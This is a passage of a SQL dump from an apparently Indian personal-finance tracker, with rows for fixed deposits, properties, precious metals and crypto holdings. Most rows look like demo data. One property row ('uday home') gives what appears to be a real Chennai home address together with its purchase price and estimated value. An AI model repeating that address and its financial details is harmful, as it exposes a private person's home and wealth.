INSERT INTO "manual_fixed_deposit_holdings" ("id", "user_id", "bank_name", "fd_number", "account_number", "branch_name", "deposit_type", "principal_amount", "interest_rate", "tenure_months", "tenure_days", "deposit_date", "maturity_date", "interest_frequency", "interest_payout", "tds_applicable", "tds_deducted", "maturity_amount", "interest_earned", "current_value", "nominee_name", "nominee_relation", "status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (5, 30, 'ICICI Bank', 'FD789012', '60200987654321', 'Delhi Connaught Place', 'Tax Saver', 150000.0, 7.0, 60, NULL, '2024-04-01', '2029-04-01', 'Annual', 'Payout', FALSE, 0.0, 202500.0, 52500.0, 166397.2602739726, 'Parent Name', 'Parent', 'Active', 'Tax Saving', 'Fixed Deposit', NULL, TRUE, '2025-10-23T03:07:05.454215', '2025-10-23T03:07:05.454218', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_fixed_deposit_holdings" ("id", "user_id", "bank_name", "fd_number", "account_number", "branch_name", "deposit_type", "principal_amount", "interest_rate", "tenure_months", "tenure_days", "deposit_date", "maturity_date", "interest_frequency", "interest_payout", "tds_applicable", "tds_deducted", "maturity_amount", "interest_earned", "current_value", "nominee_name", "nominee_relation", "status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (6, 30, 'SBI', 'SBI345678', '12345678901', 'Bangalore Koramangala', 'Senior Citizen', 300000.0, 7.75, 12, NULL, '2024-01-15', '2025-01-15', 'Quarterly', 'Payout', TRUE, 0.0, 323250.0, 23250.0, 323250.0, 'Child Name', 'Child', 'Matured', 'Senior Citizen FD', 'Fixed Deposit', NULL, TRUE, '2025-10-23T03:07:05.531036', '2025-10-23T03:07:05.531041', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_fixed_deposit_holdings" ("id", "user_id", "bank_name", "fd_number", "account_number", "branch_name", "deposit_type", "principal_amount", "interest_rate", "tenure_months", "tenure_days", "deposit_date", "maturity_date", "interest_frequency", "interest_payout", "tds_applicable", "tds_deducted", "maturity_amount", "interest_earned", "current_value", "nominee_name", "nominee_relation", "status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (7, 34, 'State Bank of India', 'SBI-FD-2024-001', NULL, NULL, 'Regular', 500000.0, 7.25, 12, NULL, '2024-01-15', '2025-01-15', NULL, NULL, TRUE, NULL, 536250.0, 36250.0, 536250.0, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:33:35.518540', '2025-10-31T16:33:35.518540', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_fixed_deposit_holdings" ("id", "user_id", "bank_name", "fd_number", "account_number", "branch_name", "deposit_type", "principal_amount", "interest_rate", "tenure_months", "tenure_days", "deposit_date", "maturity_date", "interest_frequency", "interest_payout", "tds_applicable", "tds_deducted", "maturity_amount", "interest_earned", "current_value", "nominee_name", "nominee_relation", "status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (8, 34, 'HDFC Bank Ltd', 'HDFC-FD-2024-005', NULL, NULL, 'Cumulative', 300000.0, 7.1, 24, NULL, '2024-06-01', '2026-06-01', NULL, NULL, TRUE, NULL, 342600.0, 42600.0, 321300.0, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:33:35.518540', '2025-10-31T16:33:35.518540', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_fixed_deposit_holdings" ("id", "user_id", "bank_name", "fd_number", "account_number", "branch_name", "deposit_type", "principal_amount", "interest_rate", "tenure_months", "tenure_days", "deposit_date", "maturity_date", "interest_frequency", "interest_payout", "tds_applicable", "tds_deducted", "maturity_amount", "interest_earned", "current_value", "nominee_name", "nominee_relation", "status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (9, 35, 'ICICI Bank', 'ICICI-FD-2024-008', NULL, NULL, 'Regular', 750000.0, 7.4, 18, NULL, '2024-04-01', '2025-10-01', NULL, NULL, TRUE, NULL, 833250.0, 83250.0, 810000.0, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:33:38.987045', '2025-10-31T16:33:38.987045', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_fixed_deposit_holdings" ("id", "user_id", "bank_name", "fd_number", "account_number", "branch_name", "deposit_type", "principal_amount", "interest_rate", "tenure_months", "tenure_days", "deposit_date", "maturity_date", "interest_frequency", "interest_payout", "tds_applicable", "tds_deducted", "maturity_amount", "interest_earned", "current_value", "nominee_name", "nominee_relation", "status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (10, 35, 'Axis Bank', 'AXIS-FD-2024-012', NULL, NULL, 'Flexi', 450000.0, 6.95, 36, NULL, '2024-02-15', '2027-02-15', NULL, NULL, FALSE, NULL, 544050.0, 94050.0, 477750.0, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:33:38.987045', '2025-10-31T16:33:38.987045', NULL, 'live') ON CONFLICT DO NOTHING;

-- Table: manual_real_estate_holdings
-- Exported: 2026-01-25T05:09:41.137633
-- Rows: 5

INSERT INTO "manual_real_estate_holdings" ("id", "user_id", "property_name", "property_type", "property_subtype", "address", "city", "state", "pincode", "area_sqft", "area_unit", "bedrooms", "bathrooms", "purchase_date", "purchase_price", "stamp_duty", "registration_charges", "brokerage", "other_charges", "total_investment", "loan_amount", "loan_bank", "loan_account_number", "emi_amount", "loan_tenure_months", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "is_rented", "monthly_rent", "tenant_name", "lease_start_date", "lease_end_date", "property_tax_annual", "maintenance_monthly", "insurance_annual", "ownership_type", "deed_number", "survey_number", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (3, 30, '3 BHK Apartment - Prestige Lakeside', 'Residential', 'Apartment', 'Prestige Lakeside Habitat, Varthur Road', 'Bangalore', 'Karnataka', '560103', 1650.0, 'sqft', 3, 3, '2020-03-15', 12500000.0, 750000.0, 50000.0, 125000.0, 75000.0, 13500000.0, 8500000.0, 'HDFC Home Loans', NULL, 75000.0, 240, 16500000.0, '2024-10-01', 3000000.0, 22.22222222222222, TRUE, 45000.0, 'Corporate Tenant', '2024-06-01', '2026-05-31', 18000.0, 8500.0, 0.0, NULL, NULL, NULL, 'Real Estate', 'Real Estate', NULL, TRUE, '2025-10-23T03:07:05.981500', '2025-10-23T03:07:05.981503', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_real_estate_holdings" ("id", "user_id", "property_name", "property_type", "property_subtype", "address", "city", "state", "pincode", "area_sqft", "area_unit", "bedrooms", "bathrooms", "purchase_date", "purchase_price", "stamp_duty", "registration_charges", "brokerage", "other_charges", "total_investment", "loan_amount", "loan_bank", "loan_account_number", "emi_amount", "loan_tenure_months", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "is_rented", "monthly_rent", "tenant_name", "lease_start_date", "lease_end_date", "property_tax_annual", "maintenance_monthly", "insurance_annual", "ownership_type", "deed_number", "survey_number", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (4, 30, 'Commercial Shop - Phoenix Market City', 'Commercial', 'Shop', 'Phoenix Market City, Whitefield', 'Bangalore', 'Karnataka', '560066', 450.0, 'sqft', NULL, NULL, '2019-08-01', 8500000.0, 510000.0, 35000.0, 85000.0, 50000.0, 9180000.0, 0.0, NULL, NULL, 0.0, NULL, 12000000.0, '2024-09-01', 2820000.0, 30.718954248366014, TRUE, 85000.0, 'Retail Store', '2023-01-01', '2026-12-31', 42000.0, 12000.0, 0.0, NULL, NULL, NULL, 'Commercial RE', 'Real Estate', NULL, TRUE, '2025-10-23T03:07:06.058271', '2025-10-23T03:07:06.058274', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_real_estate_holdings" ("id", "user_id", "property_name", "property_type", "property_subtype", "address", "city", "state", "pincode", "area_sqft", "area_unit", "bedrooms", "bathrooms", "purchase_date", "purchase_price", "stamp_duty", "registration_charges", "brokerage", "other_charges", "total_investment", "loan_amount", "loan_bank", "loan_account_number", "emi_amount", "loan_tenure_months", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "is_rented", "monthly_rent", "tenant_name", "lease_start_date", "lease_end_date", "property_tax_annual", "maintenance_monthly", "insurance_annual", "ownership_type", "deed_number", "survey_number", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (5, 35, 'Prestige Lakeside Habitat 2BHK', 'Residential', 'Apartment', 'Varthur Main Road, Whitefield', 'Bangalore', 'Karnataka', NULL, 1250.0, NULL, 2, 2, '2020-06-15', 6500000.0, NULL, NULL, NULL, NULL, 6500000.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, 35000.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:42:10.016616', '2025-10-31T16:42:10.016616', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_real_estate_holdings" ("id", "user_id", "property_name", "property_type", "property_subtype", "address", "city", "state", "pincode", "area_sqft", "area_unit", "bedrooms", "bathrooms", "purchase_date", "purchase_price", "stamp_duty", "registration_charges", "brokerage", "other_charges", "total_investment", "loan_amount", "loan_bank", "loan_account_number", "emi_amount", "loan_tenure_months", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "is_rented", "monthly_rent", "tenant_name", "lease_start_date", "lease_end_date", "property_tax_annual", "maintenance_monthly", "insurance_annual", "ownership_type", "deed_number", "survey_number", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (6, 35, 'Commercial Shop - MG Road', 'Commercial', 'Retail Shop', 'MG Road, Brigade Road Junction', 'Bangalore', 'Karnataka', NULL, 450.0, NULL, 0, 1, '2019-03-20', 8500000.0, NULL, NULL, NULL, NULL, 8500000.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, 75000.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:42:10.016616', '2025-10-31T16:42:10.016616', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_real_estate_holdings" ("id", "user_id", "property_name", "property_type", "property_subtype", "address", "city", "state", "pincode", "area_sqft", "area_unit", "bedrooms", "bathrooms", "purchase_date", "purchase_price", "stamp_duty", "registration_charges", "brokerage", "other_charges", "total_investment", "loan_amount", "loan_bank", "loan_account_number", "emi_amount", "loan_tenure_months", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "is_rented", "monthly_rent", "tenant_name", "lease_start_date", "lease_end_date", "property_tax_annual", "maintenance_monthly", "insurance_annual", "ownership_type", "deed_number", "survey_number", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (7, 27, 'uday home', 'Residential', 'Villa', E'4/47 4th cross st, Srinivasan Nagar,\r\nKolathur, Chennai 99', 'Kolathur', 'Tamil Nadu', '600099', NULL, 'sqft', 4, 1, '2022-01-09', 10000000.0, 21212.0, 0.0, 0.0, 0.0, 10021212.0, 0.0, '', '', 0.0, NULL, 15000000.0, '2026-01-07', 4978788.0, 49.682493494798834, FALSE, 0.0, '', NULL, NULL, 0.0, 0.0, 0.0, '', '', NULL, 'Default', 'Real Estate', '', TRUE, '2026-01-09T05:39:44.968612', '2026-01-09T05:39:44.968615', NULL, 'live') ON CONFLICT DO NOTHING;

-- Table: manual_commodity_holdings
-- Exported: 2026-01-25T05:09:41.290587
-- Rows: 10

INSERT INTO "manual_commodity_holdings" ("id", "user_id", "commodity_type", "commodity_form", "sub_form", "item_name", "purity", "weight_grams", "weight_unit", "purchase_date", "quantity", "purchase_rate_per_gram", "purchase_amount", "making_charges", "gst", "other_charges", "total_investment", "vendor_name", "bill_number", "hallmark_number", "current_rate_per_gram", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "storage_location", "locker_number", "locker_rent_annual", "insurance_annual", "digital_platform", "digital_account_id", "bond_issue_number", "bond_maturity_date", "bond_interest_rate", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (5, 30, 'Gold', 'Physical', 'Jewelry', '22K Gold Necklace Set', '22K', 85.5, 'grams', '2022-11-10', 1.0, 5200.0, 444600.0, 35000.0, 23988.0, 0.0, 503588.0, 'Tanishq', 'TAN123456', 'BIS916', 6450.0, 551475.0, '2025-10-23', 47887.0, 9.50916225168193, 'Bank Locker', 'L123', 3500.0, 2000.0, NULL, NULL, NULL, NULL, NULL, 'Gold Physical', 'Commodity', NULL, TRUE, '2025-10-23T03:07:06.508692', '2025-10-23T03:07:06.508694', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_commodity_holdings" ("id", "user_id", "commodity_type", "commodity_form", "sub_form", "item_name", "purity", "weight_grams", "weight_unit", "purchase_date", "quantity", "purchase_rate_per_gram", "purchase_amount", "making_charges", "gst", "other_charges", "total_investment", "vendor_name", "bill_number", "hallmark_number", "current_rate_per_gram", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "storage_location", "locker_number", "locker_rent_annual", "insurance_annual", "digital_platform", "digital_account_id", "bond_issue_number", "bond_maturity_date", "bond_interest_rate", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (6, 30, 'Gold', 'Digital Gold', 'Digital', 'Digital Gold - Paytm', '24K', 25.0, 'grams', '2024-05-15', 25.0, 6100.0, 152500.0, 0.0, 0.0, 0.0, 152500.0, NULL, NULL, NULL, 6420.0, 160500.0, '2025-10-23', 8000.0, 5.245901639344262, NULL, NULL, 0.0, 0.0, 'Paytm', 'PTM987654321', NULL, NULL, NULL, 'Digital Gold', 'Commodity', NULL, TRUE, '2025-10-23T03:07:06.585990', '2025-10-23T03:07:06.585994', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_commodity_holdings" ("id", "user_id", "commodity_type", "commodity_form", "sub_form", "item_name", "purity", "weight_grams", "weight_unit", "purchase_date", "quantity", "purchase_rate_per_gram", "purchase_amount", "making_charges", "gst", "other_charges", "total_investment", "vendor_name", "bill_number", "hallmark_number", "current_rate_per_gram", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "storage_location", "locker_number", "locker_rent_annual", "insurance_annual", "digital_platform", "digital_account_id", "bond_issue_number", "bond_maturity_date", "bond_interest_rate", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (7, 30, 'Gold', 'Sovereign Gold Bond', NULL, 'Sovereign Gold Bond 2023-24 Series IV', NULL, 50.0, 'grams', '2024-02-01', 50.0, 5950.0, 297500.0, 0.0, 0.0, 0.0, 297500.0, NULL, NULL, NULL, 6420.0, 321000.0, '2025-10-23', 23500.0, 7.899159663865546, NULL, NULL, 0.0, 0.0, NULL, NULL, NULL, NULL, NULL, 'SGB', 'Commodity', NULL, TRUE, '2025-10-23T03:07:06.585996', '2025-10-23T03:07:06.585997', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_commodity_holdings" ("id", "user_id", "commodity_type", "commodity_form", "sub_form", "item_name", "purity", "weight_grams", "weight_unit", "purchase_date", "quantity", "purchase_rate_per_gram", "purchase_amount", "making_charges", "gst", "other_charges", "total_investment", "vendor_name", "bill_number", "hallmark_number", "current_rate_per_gram", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "storage_location", "locker_number", "locker_rent_annual", "insurance_annual", "digital_platform", "digital_account_id", "bond_issue_number", "bond_maturity_date", "bond_interest_rate", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (8, 30, 'Silver', 'Physical', 'Coins', '999 Silver Coins', '999', 500.0, 'grams', '2023-06-20', 50.0, 72.0, 36000.0, 0.0, 1800.0, 0.0, 37800.0, 'MMTC-PAMP', NULL, NULL, 85.0, 42500.0, '2025-10-23', 4700.0, 12.433862433862434, 'Home Safe', NULL, 0.0, 0.0, NULL, NULL, NULL, NULL, NULL, 'Silver', 'Commodity', NULL, TRUE, '2025-10-23T03:07:06.662673', '2025-10-23T03:07:06.662677', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_commodity_holdings" ("id", "user_id", "commodity_type", "commodity_form", "sub_form", "item_name", "purity", "weight_grams", "weight_unit", "purchase_date", "quantity", "purchase_rate_per_gram", "purchase_amount", "making_charges", "gst", "other_charges", "total_investment", "vendor_name", "bill_number", "hallmark_number", "current_rate_per_gram", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "storage_location", "locker_number", "locker_rent_annual", "insurance_annual", "digital_platform", "digital_account_id", "bond_issue_number", "bond_maturity_date", "bond_interest_rate", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (9, 34, 'Gold', 'Digital Gold', NULL, 'Digital Gold - Augmont', '24K 999', 50.0, NULL, '2024-03-15', 50.0, 5800.0, 290000.0, NULL, NULL, NULL, 290000.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Digital Vault', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:40:30.648497', '2025-10-31T16:40:30.648497', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_commodity_holdings" ("id", "user_id", "commodity_type", "commodity_form", "sub_form", "item_name", "purity", "weight_grams", "weight_unit", "purchase_date", "quantity", "purchase_rate_per_gram", "purchase_amount", "making_charges", "gst", "other_charges", "total_investment", "vendor_name", "bill_number", "hallmark_number", "current_rate_per_gram", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "storage_location", "locker_number", "locker_rent_annual", "insurance_annual", "digital_platform", "digital_account_id", "bond_issue_number", "bond_maturity_date", "bond_interest_rate", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (10, 34, 'Gold', 'Sovereign Gold Bond', NULL, 'SGB Series IV 2022-23', '24K 999', 25.0, NULL, '2022-09-20', 25.0, 5150.0, 128750.0, NULL, NULL, NULL, 128750.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Demat Account', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:40:30.648497', '2025-10-31T16:40:30.648497', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_commodity_holdings" ("id", "user_id", "commodity_type", "commodity_form", "sub_form", "item_name", "purity", "weight_grams", "weight_unit", "purchase_date", "quantity", "purchase_rate_per_gram", "purchase_amount", "making_charges", "gst", "other_charges", "total_investment", "vendor_name", "bill_number", "hallmark_number", "current_rate_per_gram", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "storage_location", "locker_number", "locker_rent_annual", "insurance_annual", "digital_platform", "digital_account_id", "bond_issue_number", "bond_maturity_date", "bond_interest_rate", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (11, 34, 'Gold', 'Physical Jewellery', NULL, 'Gold Necklace 22K', '22K 916', 30.0, NULL, '2023-04-10', 30.0, 5500.0, 165000.0, NULL, NULL, NULL, 165000.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Bank Locker', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:40:30.648497', '2025-10-31T16:40:30.648497', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_commodity_holdings" ("id", "user_id", "commodity_type", "commodity_form", "sub_form", "item_name", "purity", "weight_grams", "weight_unit", "purchase_date", "quantity", "purchase_rate_per_gram", "purchase_amount", "making_charges", "gst", "other_charges", "total_investment", "vendor_name", "bill_number", "hallmark_number", "current_rate_per_gram", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "storage_location", "locker_number", "locker_rent_annual", "insurance_annual", "digital_platform", "digital_account_id", "bond_issue_number", "bond_maturity_date", "bond_interest_rate", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (12, 35, 'Silver', 'Physical Silver', NULL, 'Silver Coins (10g each)', '999', 500.0, NULL, '2024-05-10', 50.0, 72.0, 36000.0, NULL, NULL, NULL, 36000.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Home Safe', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:40:35.313020', '2025-10-31T16:40:35.313020', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_commodity_holdings" ("id", "user_id", "commodity_type", "commodity_form", "sub_form", "item_name", "purity", "weight_grams", "weight_unit", "purchase_date", "quantity", "purchase_rate_per_gram", "purchase_amount", "making_charges", "gst", "other_charges", "total_investment", "vendor_name", "bill_number", "hallmark_number", "current_rate_per_gram", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "storage_location", "locker_number", "locker_rent_annual", "insurance_annual", "digital_platform", "digital_account_id", "bond_issue_number", "bond_maturity_date", "bond_interest_rate", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (13, 35, 'Gold', 'Gold ETF', NULL, 'Nippon India Gold BeES', '24K', 100.0, NULL, '2024-06-15', 100.0, 5950.0, 595000.0, NULL, NULL, NULL, 595000.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Demat Account', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:40:35.313020', '2025-10-31T16:40:35.313020', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_commodity_holdings" ("id", "user_id", "commodity_type", "commodity_form", "sub_form", "item_name", "purity", "weight_grams", "weight_unit", "purchase_date", "quantity", "purchase_rate_per_gram", "purchase_amount", "making_charges", "gst", "other_charges", "total_investment", "vendor_name", "bill_number", "hallmark_number", "current_rate_per_gram", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "storage_location", "locker_number", "locker_rent_annual", "insurance_annual", "digital_platform", "digital_account_id", "bond_issue_number", "bond_maturity_date", "bond_interest_rate", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (14, 35, 'Gold', 'Digital Gold', NULL, 'Digital Gold - SafeGold', '24K 999', 75.0, NULL, '2024-08-01', 75.0, 6100.0, 457500.0, NULL, NULL, NULL, 457500.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'Digital Vault', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:40:35.313020', '2025-10-31T16:40:35.313020', NULL, 'live') ON CONFLICT DO NOTHING;

-- Table: manual_cryptocurrency_holdings
-- Exported: 2026-01-25T05:09:41.441267
-- Rows: 11

INSERT INTO "manual_cryptocurrency_holdings" ("id", "user_id", "crypto_symbol", "crypto_name", "platform", "wallet_type", "wallet_address", "purchase_date", "quantity", "purchase_rate_inr", "purchase_amount", "transaction_fee", "gas_fee", "other_charges", "total_investment", "transaction_id", "transaction_hash", "current_rate_inr", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "is_staked", "staking_platform", "staking_apy", "staking_rewards_earned", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (5, 30, 'BTC', 'Bitcoin', 'WazirX', 'Exchange', NULL, '2023-01-15', 0.15, 1850000.0, 277500.0, 555.0, 0.0, 0.0, 278055.0, NULL, NULL, 5600000.0, 840000.0, '2025-10-23', 561945.0, 202.09850569132004, FALSE, NULL, NULL, 0.0, 'Crypto', 'Cryptocurrency', NULL, TRUE, '2025-10-23T03:07:07.116423', '2025-10-23T03:07:07.116426', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_cryptocurrency_holdings" ("id", "user_id", "crypto_symbol", "crypto_name", "platform", "wallet_type", "wallet_address", "purchase_date", "quantity", "purchase_rate_inr", "purchase_amount", "transaction_fee", "gas_fee", "other_charges", "total_investment", "transaction_id", "transaction_hash", "current_rate_inr", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "is_staked", "staking_platform", "staking_apy", "staking_rewards_earned", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (6, 30, 'ETH', 'Ethereum', 'CoinDCX', 'Exchange', NULL, '2023-05-20', 2.5, 145000.0, 362500.0, 725.0, 125.0, 0.0, 363350.0, NULL, NULL, 190000.0, 475000.0, '2025-10-23', 111650.0, 30.727948259254163, TRUE, 'CoinDCX Earn', 5.5, 8500.0, 'Crypto', 'Cryptocurrency', NULL, TRUE, '2025-10-23T03:07:07.192341', '2025-10-23T03:07:07.192344', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_cryptocurrency_holdings" ("id", "user_id", "crypto_symbol", "crypto_name", "platform", "wallet_type", "wallet_address", "purchase_date", "quantity", "purchase_rate_inr", "purchase_amount", "transaction_fee", "gas_fee", "other_charges", "total_investment", "transaction_id", "transaction_hash", "current_rate_inr", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "is_staked", "staking_platform", "staking_apy", "staking_rewards_earned", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (7, 30, 'BNB', 'Binance Coin', 'WazirX', 'Exchange', NULL, '2024-03-10', 5.0, 32000.0, 160000.0, 320.0, 0.0, 0.0, 160320.0, NULL, NULL, 42000.0, 210000.0, '2025-10-23', 49680.0, 30.988023952095805, FALSE, NULL, NULL, 0.0, 'Crypto', 'Cryptocurrency', NULL, TRUE, '2025-10-23T03:07:07.266847', '2025-10-23T03:07:07.266851', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_cryptocurrency_holdings" ("id", "user_id", "crypto_symbol", "crypto_name", "platform", "wallet_type", "wallet_address", "purchase_date", "quantity", "purchase_rate_inr", "purchase_amount", "transaction_fee", "gas_fee", "other_charges", "total_investment", "transaction_id", "transaction_hash", "current_rate_inr", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "is_staked", "staking_platform", "staking_apy", "staking_rewards_earned", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (8, 30, 'SOL', 'Solana', 'CoinDCX', 'Hardware Wallet', NULL, '2024-07-05', 15.0, 12000.0, 180000.0, 360.0, 0.0, 0.0, 180360.0, NULL, NULL, 11500.0, 172500.0, '2025-10-23', -7860.0, -4.357950765136394, FALSE, NULL, NULL, 0.0, 'Crypto', 'Cryptocurrency', NULL, TRUE, '2025-10-23T03:07:07.266853', '2025-10-23T03:07:07.266853', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_cryptocurrency_holdings" ("id", "user_id", "crypto_symbol", "crypto_name", "platform", "wallet_type", "wallet_address", "purchase_date", "quantity", "purchase_rate_inr", "purchase_amount", "transaction_fee", "gas_fee", "other_charges", "total_investment", "transaction_id", "transaction_hash", "current_rate_inr", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "is_staked", "staking_platform", "staking_apy", "staking_rewards_earned", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (9, 34, 'BTC', 'Bitcoin', 'WazirX', 'Exchange Wallet', NULL, '2023-08-15', 0.025, 2450000.0, 61250.0, NULL, NULL, NULL, 61250.0, NULL, NULL, 5850000.0, 146250.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:41:22.775619', '2025-10-31T16:41:22.775619', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_cryptocurrency_holdings" ("id", "user_id", "crypto_symbol", "crypto_name", "platform", "wallet_type", "wallet_address", "purchase_date", "quantity", "purchase_rate_inr", "purchase_amount", "transaction_fee", "gas_fee", "other_charges", "total_investment", "transaction_id", "transaction_hash", "current_rate_inr", "current_market_value", "valuation_date", "unrealized_gain", "unrealized_gain_percentage", "is_staked", "staking_platform", "staking_apy", "staking_rewards_earned", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (10, 34, 'ETH', 'Ethereum', 'CoinDCX', 'Exchange Wallet', NULL, '2024-02-20', 0.5, 185000.0, 92500.0, NULL, NULL, NULL, 92500.0, NULL, NULL, 280000.0, 140000.0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:41:22.775619', '2025-10-31T16:41:22.775619', NULL, 'live') ON CONFLICT DO NOTHING;
